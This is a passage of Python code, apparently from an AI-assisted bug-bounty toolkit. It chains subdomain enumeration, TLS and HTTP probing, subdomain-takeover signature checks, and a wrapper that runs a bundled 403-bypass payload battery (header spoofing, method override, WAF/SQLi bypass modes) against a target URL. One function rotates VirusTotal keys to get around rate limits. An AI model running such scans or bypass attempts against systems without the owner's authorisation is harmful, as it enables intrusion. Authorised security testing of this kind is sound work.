    elif isinstance(raw_subdomains, str) and "," in raw_subdomains:
        sub_list = [s.strip().lower() for s in raw_subdomains.split(",") if s.strip()]
    else:
        sub_list = [str(raw_subdomains).strip().lower()]

    cleaned = []
    for s in sub_list:
        if s.startswith(("http://", "https://")):
            s = urlparse(s).netloc.split(":")[0]
        if s:
            cleaned.append(s)

    if not cleaned:
        return {"error": "No subdomains provided for permutation generation."}

    auto_install = bool(load_config().get("auto_install_missing_tools", False))
    check = ensure_tool("alterx", emit=emit, auto_install=auto_install)
    if not check["available"]:
        if emit and hasattr(emit, "warn"):
            emit.warn(check["message"])
        return {
            "error": "alterx not installed",
            "message": check["message"],
            "hint": "pdtm -i alterx"
        }

    binary = get_binary_path("alterx") or "alterx"

    limit = int(args.get("limit", 500))
    cmd = [binary, "-silent", "-limit", str(limit)]

    candidates = []
    try:
        input_data = "\n".join(cleaned)
        proc = subprocess.run(cmd, input=input_data, capture_output=True, text=True, timeout=60)
        candidates = [l.strip().lower() for l in proc.stdout.splitlines() if l.strip() and "." in l]
    except Exception as e:
        return {"error": f"alterx execution failed: {e}"}

    return {
        "count": len(candidates),
        "candidates": candidates[:100],  # Return first 100 in context
        "total_generated": len(candidates)
    }


def _execute_resolve_candidates(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, Any]:
    """Bulk-resolve and filter candidate domain names using dnsx."""
    raw_candidates = args.get("candidates") or args.get("domains") or args.get("subdomains")
    if isinstance(raw_candidates, list):
        cand_list = [str(c).strip().lower() for c in raw_candidates if str(c).strip()]
    elif isinstance(raw_candidates, str) and "," in raw_candidates:
        cand_list = [c.strip().lower() for c in raw_candidates.split(",") if c.strip()]
    elif isinstance(raw_candidates, str) and raw_candidates.strip():
        cand_list = [raw_candidates.strip().lower()]
    else:
        cand_list = target.state.get("subdomains", [target.name])

    cleaned = []
    for c in cand_list:
        if c.startswith(("http://", "https://")):
            c = urlparse(c).netloc.split(":")[0]
        if c:
            cleaned.append(c)

    if not cleaned:
        return {"error": "No candidate domains provided for resolution."}

    # dnsx is the fast path (bulk, concurrent, gives A + CNAME in one pass)
    # but it's one specific Go binary — on a box where it (or pdtm) was
    # never installed, this used to just fail outright with "dnsx not
    # installed" and nothing resolved at all. There's always a way to do
    # plain DNS resolution: dnspython if it happens to be installed, and
    # failing that the Python standard library itself (socket), which is
    # guaranteed present on every Python install with no extra dependency.
    # Falls through in that order rather than refusing to resolve anything.
    auto_install = bool(load_config().get("auto_install_missing_tools", False))
    resolved = []
    used_method = "dnsx"

    if is_available("dnsx") or (auto_install and ensure_tool("dnsx", emit=emit, auto_install=True)["available"]):
        binary = get_binary_path("dnsx") or "dnsx"

        import tempfile
        with tempfile.NamedTemporaryFile(mode="w", delete=False) as f:
            f.write("\n".join(cleaned) + "\n")
            tmp_path = f.name

        try:
            resolvers = _resolve_resolvers_path()
            cmd = [binary, "-l", tmp_path, "-silent", "-json", "-a", "-cname", "-resp"]
            if resolvers and os.path.exists(resolvers):
                cmd.extend(["-r", resolvers])

            proc = _run_cmd_with_heartbeat(cmd, timeout=120, emit=emit, label="resolve_candidates (DNS resolution)")
            if proc.stdout.strip():
                for line in proc.stdout.splitlines():
                    if line.strip():
                        try:
                            item = json.loads(line.strip())
                            host = item.get("host")
                            if host:
                                resolved.append({
                                    "host": host,
                                    "a": item.get("a", []),
                                    "cname": item.get("cname", []),
                                    "status_code": item.get("status_code", "NOERROR")
                                })
                        except Exception:
                            pass
        except Exception as e:
            return {"error": f"dnsx resolution failed: {e}"}
        finally:
            if os.path.exists(tmp_path):
                try:
                    os.remove(tmp_path)
                except Exception:
                    pass
    else:
        if emit and hasattr(emit, "info"):
            emit.info("[*] dnsx not installed — falling back to plain DNS resolution (no CNAME chain, one host at a time, slower on large lists).")
        try:
            import dns.resolver as _dnspython  # type: ignore
            used_method = "dnspython"
        except Exception:
            _dnspython = None
            used_method = "socket"

        import socket
        for host in cleaned:
            a_records: List[str] = []
            cname_records: List[str] = []
            try:
                if _dnspython is not None:
                    try:
                        for rr in _dnspython.resolve(host, "A"):
                            a_records.append(str(rr))
                    except Exception:
                        pass
                    try:
                        for rr in _dnspython.resolve(host, "CNAME"):
                            cname_records.append(str(rr).rstrip("."))
                    except Exception:
                        pass
                else:
                    # Plain stdlib socket — A records only, no CNAME chain
                    # visibility (the OS resolver follows CNAMEs itself
                    # before handing back the final address), but this
                    # requires zero external tools or packages at all.
                    _, aliases, addrs = socket.gethostbyname_ex(host)
                    a_records = list(addrs)
                    cname_records = [a for a in aliases if a != host]
            except (socket.gaierror, Exception):
                continue
            if a_records or cname_records:
                resolved.append({
                    "host": host, "a": a_records, "cname": cname_records,
                    "status_code": "NOERROR",
                })

    # Update target state
    if "subdomains" not in target.state:
        target.state["subdomains"] = []
    for r in resolved:
        h = r["host"]
        if h not in target.state["subdomains"]:
            target.state["subdomains"].append(h)

    return {
        "count": len(resolved),
        "resolved": resolved[:100],
        "total_resolved": len(resolved),
        "method": used_method,
    }


def _execute_subdomain_sweep(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, Any]:
    """
    One call instead of three: subfinder (passive OSINT) -> alterx
    (permutation mutations) -> dnsx (bulk resolve), chained automatically.
    This was explicitly flagged as a session friction point: "give me all
    live subdomains" currently takes the model three separate tool calls,
    manually passing each stage's output into the next. Each stage still
    degrades gracefully on its own (same behavior as calling them
    individually) -- a missing alterx just skips permutation with a note,
    rather than failing the whole sweep, since subfinder's own findings are
    still worth resolving on their own.
    """
    domain = args.get("domain") or target.name
    permute = bool(args.get("permute", True))
    permute_limit = args.get("permute_limit", 300)

    stages: Dict[str, Any] = {}

    subfinder_res = _execute_subfinder({"domain": domain}, target, emit)
    stages["subfinder"] = subfinder_res
    if subfinder_res.get("error"):
        return {
            "domain": domain,
            "stages": stages,
            "error": f"Passive subdomain discovery failed, nothing to permute/resolve: {subfinder_res['error']}",
        }

    passive = list(target.state.get("subdomains") or subfinder_res.get("subdomains") or [])

    permutation_candidates: List[str] = []
    if permute and passive:
        perm_res = _execute_permute_subdomains(
            {"subdomains": passive[:50], "limit": permute_limit}, target, emit
        )
        stages["permute_subdomains"] = perm_res
        if not perm_res.get("error"):
            permutation_candidates = perm_res.get("candidates", [])
    elif permute and not passive:
        stages["permute_subdomains"] = {"skipped": "no passive subdomains found to permute from"}

    to_resolve = sorted(set(passive) | set(permutation_candidates))
    if not to_resolve:
        return {
            "domain": domain,
            "stages": stages,
            "passive_subdomains_found": len(passive),
            "permutation_candidates_generated": len(permutation_candidates),
            "live_hosts_resolved": 0,
            "live_hosts": [],
            "note": "No candidates to resolve.",
        }

    resolve_res = _execute_resolve_candidates({"candidates": to_resolve}, target, emit)
    stages["resolve_candidates"] = resolve_res

    return {
        "domain": domain,
        "stages": stages,
        "passive_subdomains_found": len(passive),
        "permutation_candidates_generated": len(permutation_candidates),
        "live_hosts_resolved": resolve_res.get("total_resolved", 0),
        "live_hosts": resolve_res.get("resolved", [])[:100],
        "resolution_method": resolve_res.get("method"),
    }


def _execute_tls_cert_scan(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, Any]:
    """Scan and parse TLS/SSL certificate SANs and CNs using tlsx to discover related infrastructure."""
    raw_target = args.get("hosts") or args.get("target") or args.get("domains") or target.name
    targets_to_scan = []
    if isinstance(raw_target, list):
        targets_to_scan = [str(t).strip() for t in raw_target if str(t).strip()]
    elif isinstance(raw_target, str) and "," in raw_target:
        targets_to_scan = [t.strip() for t in raw_target.split(",") if t.strip()]
    else:
        targets_to_scan = [str(raw_target).strip()]

    cleaned_targets = []
    for t in targets_to_scan:
        if t.startswith(("http://", "https://")):
            t = urlparse(t).netloc.split(":")[0]
        if t:
            cleaned_targets.append(t)

    if not cleaned_targets:
        return {"error": "No valid hosts provided for TLS certificate scan."}

    auto_install = bool(load_config().get("auto_install_missing_tools", False))
    check = ensure_tool("tlsx", emit=emit, auto_install=auto_install)
    if not check["available"]:
        if emit and hasattr(emit, "warn"):
            emit.warn(check["message"])
        return {
            "error": "tlsx not installed",
            "message": check["message"],
            "hint": "pdtm -i tlsx"
        }

    binary = get_binary_path("tlsx") or "tlsx"

    port = str(args.get("port", "443")).strip()
    cmd = [binary, "-san", "-cn", "-so", "-silent", "-json", "-p", port]

    results = []
    discovered_sans = set()
    try:
        input_data = "\n".join(cleaned_targets)
        proc = subprocess.run(cmd, input=input_data, capture_output=True, text=True, timeout=60)
        if proc.stdout.strip():
            for line in proc.stdout.splitlines():
                if line.strip():
                    try:
                        item = json.loads(line.strip())
                        host = item.get("host")
                        cn = item.get("subject_cn", "")
                        sans = item.get("subject_an", [])
                        results.append({
                            "host": host,
                            "ip": item.get("ip", ""),
                            "subject_cn": cn,
                            "subject_an": sans,
                            "issuer_org": item.get("issuer_org", []),
                            "tls_version": item.get("tls_version", ""),
                            "wildcard": item.get("wildcard_certificate", False)
                        })
                        if cn and "." in cn and not cn.startswith("*"):
                            discovered_sans.add(cn.lower())
                        for s in sans:
                            clean_s = s.lower().lstrip("*.")
                            if clean_s and "." in clean_s:
                                discovered_sans.add(clean_s)
                    except Exception:
                        pass
    except Exception as e:
        return {"error": f"tlsx execution failed: {e}", "hosts": cleaned_targets}

    # Update target state with discovered SAN names matching root domain if available
    san_list = sorted(list(discovered_sans))
    if "subdomains" not in target.state:
        target.state["subdomains"] = []
    for s in san_list:
        if target.name in s and s not in target.state["subdomains"]:
            target.state["subdomains"].append(s)

    return {
        "hosts_scanned": cleaned_targets,
        "count": len(results),
        "certificates": results,
        "discovered_domains": san_list[:50]
    }


def _execute_httpx(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, Any]:
    raw_target = args.get("target") or target.name
    # CAUGHT IN THE WILD: this tool's own schema describes 'target' as
    # "Target domain, URL, or LIST of subdomains" but types it as a plain
    # string — there was never a real array option for the model to use for
    # a batch. So the model (reasonably) did what the description invited:
    # serialized a batch as "host1.com,host2.com,host3.com" in one string.
    # isinstance(raw_target, list) was never true for that, so the whole
    # comma-joined blob became ONE entry in targets_to_probe, got joined
    # into httpx's stdin as a single line, and httpx tried to resolve the
    # literal string "host1.com,host2.com,host3.com" as one (invalid)
    # hostname — 0 live hosts, every time, for every batched call. A
    # single plain hostname with no comma worked fine, which is exactly
    # the "works alone, breaks as a batch" pattern this was producing.
    # Now: accept a real list (if the caller does pass one) AND split a
    # comma/whitespace/newline-separated string into multiple targets.
    targets_to_probe = []
    if isinstance(raw_target, list):
        for item in raw_target:
            targets_to_probe.extend(re.split(r"[,\s]+", str(item).strip()))
    else:
        targets_to_probe = re.split(r"[,\s]+", str(raw_target).strip())
    targets_to_probe = [t for t in targets_to_probe if t]

    auto_install = bool(load_config().get("auto_install_missing_tools", False))
    check = ensure_tool("httpx", emit=emit, auto_install=auto_install)
    if not check["available"]:
        if emit and hasattr(emit, "warn"):
            emit.warn(check["message"])

    live_hosts = []

    # 1. Try local httpx binary if available
    httpx_bin = get_binary_path("httpx") if check["available"] else None
    if httpx_bin:
        try:
            input_data = "\n".join(targets_to_probe)
            cmd = [httpx_bin, "-silent", "-status-code", "-title", "-tech-detect", "-cl", "-location", "-json"]
            proc = subprocess.run(cmd, input=input_data, capture_output=True, text=True, timeout=60)
            if proc.returncode == 0:
                for line in proc.stdout.splitlines():
                    if line.strip():
                        try:
                            item = json.loads(line.strip())
                            live_hosts.append({
                                "url": item.get("url"),
                                "status_code": item.get("status_code"),
                                "title": item.get("title", ""),
                                "tech": item.get("tech", []),
                                "webserver": item.get("webserver", ""),
                                "content_length": item.get("content_length"),
                                "location": item.get("location", "")
                            })
                        except Exception:
                            pass
        except Exception as e:
            logger.warning(f"httpx binary failed: {e}")

    # 2. Fallback to lightweight HTTP probe (runs if binary unavailable or returned no hosts)
    if not live_hosts:
        for t in targets_to_probe[:20]:
            host = t.strip()
            if not host.startswith(("http://", "https://")):
                urls = [f"https://{host}", f"http://{host}"]
            else:
                urls = [host]
            for u in urls:
                try:
                    r = requests.get(u, timeout=5, verify=False, allow_redirects=True, headers=merge_global_context({}))
                    live_hosts.append({
                        "url": u,
                        "status_code": r.status_code,
                        "title": re.search(r'<title>(.*?)</title>', r.text, re.I).group(1).strip() if re.search(r'<title>(.*?)</title>', r.text, re.I) else "",
                        "tech": [r.headers.get("Server")] if r.headers.get("Server") else [],
                        "webserver": r.headers.get("Server", ""),
                        "content_length": len(r.content) if r.content is not None else 0,
                        "location": r.headers.get("Location", "")
                    })
                    break
                except Exception:
                    continue

    # Update target state and investigation memory
    try:
        live_urls = [h.get("url") for h in live_hosts if isinstance(h, dict) and h.get("url")]
        all_techs = []
        for h in live_hosts:
            if isinstance(h, dict):
                for t in h.get("tech", []):
                    if t and t not in all_techs:
                        all_techs.append(t)
        update_from_httpx(target, live_urls, all_techs)
        save_target(target)
    except Exception:
        if "live_hosts" not in target.state:
            target.state["live_hosts"] = []
        for h in live_hosts:
            if h not in target.state["live_hosts"]:
                target.state["live_hosts"].append(h)

    return {
        "count": len(live_hosts),
        "live_hosts": live_hosts
    }


def _execute_subzy(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, Any]:
    """Subdomain takeover verification (DNS CNAME + Signature response check)."""
    subdomain = args.get("subdomain") or target.name
    subdomain = subdomain.strip().lower()
    if subdomain.startswith(("http://", "https://")):
        subdomain = urlparse(subdomain).netloc.split(":")[0]

    # Signatures of dangling CNAME services
    TAKEOVER_SIGNATURES = {
        "github": ("github.io", "There isn't a GitHub Pages site here."),
        "aws_s3": ("s3.amazonaws.com", "The specified bucket does not exist"),
        "heroku": ("herokudns.com", "No such app"),
        "shopify": ("myshopify.com", "Sorry, this shop is currently unavailable"),
        "fastly": ("fastly.net", "Fastly error: unknown domain"),
        "azure": ("azurewebsites.net", "404 Web Site not found"),
        "tumblr": ("tumblr.com", "Whatever you were looking for doesn't seem to exist"),
        "wordpress": ("wordpress.com", "Do you want to register"),
        "ghost": ("ghost.io", "The thing you were looking for is gone"),
    }

    cname_found = None
    vulnerable = False
    service_matched = None
    fingerprint = ""

    # Check DNS CNAME record
    try:
        cmd = ["dig", "+short", "CNAME", subdomain]
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
        if proc.returncode == 0 and proc.stdout.strip():
            cname_found = proc.stdout.strip().rstrip('.')
    except Exception:
        pass

    if cname_found:
        for s_name, (s_cname_pattern, s_sig) in TAKEOVER_SIGNATURES.items():
            if s_cname_pattern in cname_found:
                service_matched = s_name
                # Check HTTP response body for signature
                try:
                    r = requests.get(f"http://{subdomain}", timeout=6, verify=False)
                    if s_sig in r.text:
                        vulnerable = True
                        fingerprint = s_sig
                except Exception:
                    pass
                break

    result = {
        "subdomain": subdomain,
        "cname": cname_found or "None",
        "service": service_matched or "Unknown",
        "takeover_candidate": vulnerable,
        "evidence": fingerprint if vulnerable else ("CNAME resolved to " + (cname_found or "none"))
    }

    if vulnerable:
        finding = {
            "type": "Subdomain Takeover Candidate",
            "target": subdomain,
            "cname": cname_found,
            "service": service_matched,
            "severity": "HIGH",
            "verified": True
        }
        if finding not in target.findings:
            target.findings.append(finding)
        try:
            update_from_subzy(target, [subdomain])
        except Exception:
            pass
        save_target(target)

    return result


def _execute_takeover_scanner(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, Any]:
    """Scan subdomains for takeover vulnerabilities using subjack and signature grep."""
    subdomains = args.get("subdomains")
    if not subdomains:
        subdomains = target.state.get("subdomains", [])
    
    if not subdomains:
        return {"error": "No subdomains found to scan."}

    # Write subdomains to a temp file in target's directory
    sub_file = Path(target.dir) / "takeover_subs_temp.txt"
    try:
        with open(sub_file, "w", encoding="utf-8") as f:
            for s in subdomains:
                f.write(f"{s}\n")
    except Exception as e:
        return {"error": f"Failed to write temporary subdomains file: {e}"}

    script_path = Path(__file__).resolve().parent.parent / "tools" / "takeover_scanner.sh"
    if not script_path.exists():
        return {"error": f"takeover_scanner.sh not found at {script_path}"}

    out_dir = Path(target.dir) / "takeover"
    out_dir.mkdir(parents=True, exist_ok=True)
    results_json = out_dir / "results.json"
    if results_json.exists():
        results_json.unlink()

    env = os.environ.copy()
    env["TAKEOVER_OUT_DIR"] = str(out_dir)

    try:
        cmd = [str(script_path), str(sub_file)]
        proc = subprocess.run(cmd, capture_output=True, text=True, env=env, timeout=180)
        
        # Parse JSON output
        results = []
        if results_json.exists():
            with open(results_json, "r", encoding="utf-8") as f:
                content = f.read().strip()
                if content:
                    results = json.loads(content)
    except Exception as e:
        results = []
        return {"error": f"takeover_scanner execution failed: {e}"}
    finally:
        if sub_file.exists():
            sub_file.unlink()

    # Process and verify candidates
    takeovers_found = []
    for entry in results:
        if isinstance(entry, dict) and entry.get("vulnerable"):
            takeovers_found.append(entry)
            finding = {
                "type": "Subdomain Takeover Candidate",
                "target": entry["subdomain"],
                "cname": entry.get("cname", "None"),
                "service": entry.get("service", "Unknown"),
                "severity": "HIGH",
                "verified": True
            }
            if finding not in target.findings:
                target.findings.append(finding)
    
    if takeovers_found:
        save_target(target)

    return {
        "scanned_count": len(subdomains),
        "takeovers_found": takeovers_found,
        "count": len(takeovers_found)
    }


_ANSI_ESCAPE_RE = re.compile(r'\x1b\[[0-9;]*m')


def _execute_403_bypass(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, Any]:
    """
    Runs the bundled 403-bypass.sh payload battery (header spoofing,
    protocol/port tricks, HTTP method override, URL encoding, and a
    SQLi/WAF-bypass mode) against a URL currently returning 403/401. This
    only reports which payloads got a DIFFERENT status code back — it does
    NOT confirm any of them is a real bypass. A 2xx here can just as
    easily be a generic SPA shell, a redirect-then-200 login page, or a
    custom error page that happens to return 200, as it can be the actual
    protected content. See the 403-bypass skill's False-Positive
    Discipline section: every 2xx candidate this returns MUST be curled
    individually and its actual response body read before it's treated as
    a confirmed bypass or passed to record_finding.
    """
    url = str(args.get("url", "")).strip()
    if not url:
        return {
            "status": "no_url_given",
            "note": "Nah bro, that 403_bypass call had no url — nothing to point the battery at. Pass the exact 403/401-returning URL, then call this again.",
        }
    mode = str(args.get("mode", "exploit")).strip().lower()
    mode_flag_map = {
        "header": "--header", "protocol": "--protocol", "port": "--port",
        "httpmethod": "--HTTPmethod", "encode": "--encode", "sqli": "--SQLi", "exploit": "--exploit",
    }
    flag = mode_flag_map.get(mode)
    if not flag:
        return {
            "status": "unknown_mode",
            "note": f"Nah bro, '{mode}' isn't a real mode for this script — valid ones are {', '.join(mode_flag_map.keys())}. Pick one of those and retry.",
        }

    script_path = Path(__file__).resolve().parent.parent / "tools" / "403-bypass.sh"
    if not script_path.exists():
        return {"error": f"403-bypass.sh not found at {script_path}"}

    try:
        cmd = ["bash", str(script_path), "-u", url, flag]
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
    except subprocess.TimeoutExpired:
        return {"error": "403-bypass.sh timed out after 120s. The --exploit mode runs every technique against every payload — if the target is slow, try a narrower mode (header, protocol, port, HTTPmethod, encode, sqli) instead of exploit."}
    except Exception as e:
        return {"error": f"403-bypass.sh execution failed: {e}"}

    # The script is written for a human's terminal (ANSI colors, emoji, box
    # art) — it has no JSON/structured output mode. Strip all of that down
    # to plain "<payload label>: Status: <code>, Length: <n>" lines so the
    # results are actually usable here.
    combined = (proc.stdout or "") + "\n" + (proc.stderr or "")
    plain = _ANSI_ESCAPE_RE.sub('', combined)
    for junk in ("💀", "🍺", "👌"):
        plain = plain.replace(junk, "")
    lines = plain.splitlines()

    checks: List[Dict[str, Any]] = []
    for line in lines:
        m = re.match(r'^(.*?):\s*Status:\s*(\d{3}),\s*Length\s*:\s*(\d+)\s*$', line.strip())
        if m:
            label, status_str, length_str = m.groups()
            checks.append({"payload": label.strip(), "status": int(status_str), "length": int(length_str)})

    # The script only prints a reproducible "PAYLOAD :" curl command box
    # underneath a 2xx hit, in the same order the checks ran — pull those
    # out and attach them to the matching candidate so the model has the
    # exact request to re-curl, not just a description.
    repro_cmds: List[str] = []
    for line in lines:
        pm = re.search(r'PAYLOAD\s*:\s*(curl .+?)\s*$', line)
        if pm:
            repro_cmds.append(pm.group(1).strip())

    candidates = [c for c in checks if 200 <= c["status"] < 300]
    for idx, cand in enumerate(candidates):
        if idx < len(repro_cmds):
            cand["curl_repro"] = repro_cmds[idx]

    result: Dict[str, Any] = {
        "url": url,
        "mode": mode,
        "checks_run": len(checks),
        "candidates_2xx": candidates,
    }
    if candidates:
        result["note"] = (
            f"{len(candidates)} payload(s) came back 2xx instead of 403/401 — none of these are confirmed yet. "
            "For EACH candidate: curl it yourself with curl_repro (or the same header on a fresh request), READ the actual response body — "
            "is it the real protected content, or a generic SPA shell / redirect-to-login / custom error page that happens to return 200? — "
            "and run it through the skill's False-Positive Discipline checks (reproduce as a single clean request, retest fresh, compare "
            "against a known-bad control path) before calling record_finding. Do not record a finding off the status code alone."
        )
    else:
        result["note"] = "No payload in this battery came back 2xx — this endpoint held against these techniques. This script doesn't cover the request-smuggling/parser-discrepancy techniques in the skill's advanced section; those still need to be tried manually if this doesn't turn up anything."
    return result



# ==========================================================
# EXTRA RECON TOOLS — passive URL/asset discovery, active
# exposure sweeps, OSINT lookups. Added from the researcher's
# personal script collection; ported to native Python/structured
# JSON instead of shelling out to the original scripts so output
# matches the rest of TOOL_REGISTRY (Nah-bro voice on self-made
# mistakes, real errors as "error", no raw ANSI/banner noise).
# ==========================================================

def _execute_wayback_urls(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, Any]:
    """
    Pulls archived URLs for a domain from the Wayback Machine's CDX API —
    free, no API key, often turns up old endpoints/params/backup files
    that gau/katana never saw live. Supports subdomain inclusion, a
    sensitive-extension filter, and status-code include/exclude filters.
    """
    domain = str(args.get("domain") or target.name).strip().lower()
    if domain.startswith(("http://", "https://")):
        domain = urlparse(domain).netloc.split(":")[0]
    if not domain:
        return {
            "status": "no_domain_given",
            "note": "Nah bro, wayback_urls needs a domain — nothing to query the CDX API for. Pass one and call this again.",
        }

    include_subdomains = bool(args.get("include_subdomains", True))
    extensions_only = bool(args.get("extensions_only", False))
    status_codes = str(args.get("status_codes", "")).strip()
    exclude_status_codes = str(args.get("exclude_status_codes", "")).strip()

    ext_regex = (
        r"xls|xml|xlsx|json|pdf|sql|doc|docx|pptx|txt|git|zip|tar\.gz|tgz|bak|7z|rar|log|"
        r"cache|secret|db|backup|yml|gz|config|csv|yaml|md|md5|exe|dll|bin|ini|bat|sh|tar|"
        r"deb|rpm|iso|img|env|apk|msi|dmg|tmp|crt|pem|key|pub|asc"
    )

    url_pattern = f"*.{domain}/*" if include_subdomains else f"{domain}/*"
    params = {
        "url": url_pattern,
        "collapse": "urlkey",
        "output": "text",
        "fl": "original,statuscode",
    }
    filters = []
    if extensions_only:
        filters.append(f"original:.*\\.({ext_regex})$")
    if status_codes:
        filters.append(f"statuscode:({status_codes.replace(',', '|')})")
    if exclude_status_codes:
        filters.append(f"!statuscode:({exclude_status_codes.replace(',', '|')})")

    try:
        resp = requests.get(
            "https://web.archive.org/cdx/search/cdx",
            params=[*params.items(), *[("filter", f) for f in filters]],
            timeout=30,
        )
    except requests.RequestException as e:
        return {"error": f"Wayback CDX request failed: {e}"}

    if resp.status_code != 200:
        return {"error": f"Wayback CDX returned HTTP {resp.status_code}"}

    urls = []
    seen = set()
    for line in resp.text.splitlines():
        line = line.strip()
        if not line:
            continue
        u = line.split(" ", 1)[0]
        if u and u not in seen:
            seen.add(u)
            urls.append(u)

    if urls:
        existing = target.state.setdefault("wayback_urls", [])
        for u in urls:
            if u not in existing:
                existing.append(u)
        try:
            save_target(target)
        except Exception:
            pass

    return {
        "domain": domain,
        "url_count": len(urls),
        "urls": urls[:500],
        "truncated": len(urls) > 500,
        "note": (
            f"{len(urls)} archived URL(s) from the Wayback Machine." if urls else
            "No archived URLs found for this domain/filter combination — the CDX index may simply not have this host crawled."
        ),
    }


def _execute_otx_urls(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, Any]:
    """
    Pulls passive URL intel for a domain from AlienVault OTX's public
    hostname/url_list endpoint — free, no API key. Complements
    wayback_urls/gau with a different crawl source (threat-intel
    sandboxes, sinkholes, OSINT feeds that fed OTX).
    """
    domain = str(args.get("domain") or target.name).strip().lower()
    if domain.startswith(("http://", "https://")):
        domain = urlparse(domain).netloc.split(":")[0]
    if not domain:
        return {
            "status": "no_domain_given",
            "note": "Nah bro, otx_urls needs a domain — nothing to look up in OTX. Pass one and call this again.",
        }

    page = 1
    limit = 500
    max_pages = int(args.get("max_pages", 10))
    urls: List[str] = []
    seen = set()

    try:
        while page <= max_pages:
            resp = requests.get(
                f"https://otx.alienvault.com/api/v1/indicators/hostname/{domain}/url_list",
                params={"limit": limit, "page": page},
                timeout=20,
            )
            if resp.status_code != 200:
                break
            data = resp.json() if resp.content else {}
            entries = data.get("url_list") or []
            if not entries:
                break
            for e in entries:
                u = e.get("url")
                if u and u not in seen:
                    seen.add(u)
                    urls.append(u)
            if len(entries) < limit:
                break
            page += 1
    except requests.RequestException as e:
        return {"error": f"AlienVault OTX request failed: {e}"}
    except ValueError:
        return {"error": "AlienVault OTX returned a non-JSON response"}

    if urls:
        existing = target.state.setdefault("otx_urls", [])
        for u in urls:
            if u not in existing:
                existing.append(u)
        try:
            save_target(target)
        except Exception:
            pass

    return {
        "domain": domain,
        "pages_fetched": page,
        "url_count": len(urls),
        "urls": urls[:500],
        "truncated": len(urls) > 500,
        "note": (
            f"{len(urls)} URL(s) from AlienVault OTX passive intel." if urls else
            "No URLs on record in OTX for this domain — that's normal for a host with no threat-intel footprint, not a failure."
        ),
    }


def _execute_urlscan_recon(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, Any]:
    """
    Queries urlscan.io's search API for pages it has crawled under this
    domain, pulling out either discovered subdomains or discovered URLs.
    Needs an urlscan.io API key — set with `/apikey urlscan <key>` or the
    URLSCAN_API_KEY env var. The older `/model set-key urlscan <key>`
    still works too (same value, read as a fallback below).
    """
    cfg = load_config()
    tool_keys = cfg.get("tool_api_keys", {}) if isinstance(cfg.get("tool_api_keys"), dict) else {}
    api_keys = cfg.get("api_keys", {}) if isinstance(cfg.get("api_keys"), dict) else {}
    api_key = tool_keys.get("urlscan") or api_keys.get("urlscan") or os.environ.get("URLSCAN_API_KEY", "")
    if not api_key:
        return {
            "status": "no_api_key",
            "note": "Nah bro, urlscan_recon needs an urlscan.io API key — none is configured. Set one first: /apikey urlscan <your_api_key> (free key: https://urlscan.io/user/signup), then retry.",
        }

    domain = str(args.get("domain") or target.name).strip().lower()
    if domain.startswith(("http://", "https://")):
        domain = urlparse(domain).netloc.split(":")[0]
    if not domain:
        return {
            "status": "no_domain_given",
            "note": "Nah bro, urlscan_recon needs a domain — nothing to search for. Pass one and call this again.",
        }

    mode = str(args.get("mode", "subdomains")).strip().lower()
    if mode not in ("subdomains", "urls"):
        return {
            "status": "unknown_mode",
            "note": f"Nah bro, '{mode}' isn't valid for urlscan_recon — use 'subdomains' or 'urls'.",
        }

    try:
        resp = requests.get(
            "https://urlscan.io/api/v1/search/",
            params={"q": f"page.domain:{domain}", "size": 100},
            headers={"API-Key": api_key},
            timeout=15,
        )
    except requests.RequestException as e:
        return {"error": f"urlscan.io request failed: {e}"}

    if resp.status_code == 401:
        return {"status": "bad_api_key", "note": "Nah bro, urlscan.io rejected that API key (401) — check it with /apikey urlscan <key> and retry."}
    if resp.status_code != 200:
        return {"error": f"urlscan.io returned HTTP {resp.status_code}"}

    text = resp.text
    results: List[str]
    if mode == "subdomains":
        matched = re.findall(rf"https?://((?:[a-zA-Z0-9_-]+\.)+{re.escape(domain)})", text)
        stripped = [re.sub(r"^https?://", "", u) for u in matched]
        results = sorted({u.split("/")[0] for u in stripped if u.split("/")[0] != domain})
    else:
        matched = re.findall(rf"https?://(?:[a-zA-Z0-9_-]+\.)+{re.escape(domain)}/[^\s\"'>]+", text)
        results = sorted(set(matched))

    if results and mode == "subdomains":
        try:
            update_from_subfinder(target, results)
            save_target(target)
        except Exception:
            existing = target.state.setdefault("subdomains", [])
            for s in results:
                if s not in existing:
                    existing.append(s)

    return {
        "domain": domain,
        "mode": mode,
        "count": len(results),
        "results": results,
        "note": f"{len(results)} {mode} found via urlscan.io's search index." if results else "urlscan.io has no crawled pages under this domain yet.",
    }


def _execute_virustotal_lookup(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, Any]:
    """
    Looks up an IP or domain in VirusTotal's public v2 API: resolved
    hostnames (for an IP) and previously-seen-but-undetected URLs — useful
    for finding sibling hosts/forgotten subdomains sitting on shared
    infrastructure. Needs a VirusTotal API key — set with
    `/apikey virustotal <key>` (comma-separate multiple keys there to
    rotate across the free-tier rate limit) or VT_API_KEY env var. The
    older `/model set-key virustotal <key>` still works too (same value,
    read as a fallback below) — /apikey is just the one place to look now.
    """
    cfg = load_config()
    tool_keys = cfg.get("tool_api_keys", {}) if isinstance(cfg.get("tool_api_keys"), dict) else {}
    api_keys = cfg.get("api_keys", {}) if isinstance(cfg.get("api_keys"), dict) else {}
    raw_keys = tool_keys.get("virustotal") or api_keys.get("virustotal") or os.environ.get("VT_API_KEY", "")
    keys = [k.strip() for k in str(raw_keys).split(",") if k.strip()]
    if not keys:
        return {
            "status": "no_api_key",
            "note": "Nah bro, virustotal_lookup needs a VirusTotal API key — none is configured. Set one first: /apikey virustotal <your_api_key> (free key: https://www.virustotal.com/gui/my-apikey), then retry.",
        }

    raw_input = str(args.get("input") or args.get("domain") or args.get("ip") or target.name).strip()
    raw_input = re.sub(r"^https?://", "", raw_input).split("/")[0]
    if not raw_input:
        return {
            "status": "no_input_given",
            "note": "Nah bro, virustotal_lookup needs an IP or domain to look up. Pass one and call this again.",
        }

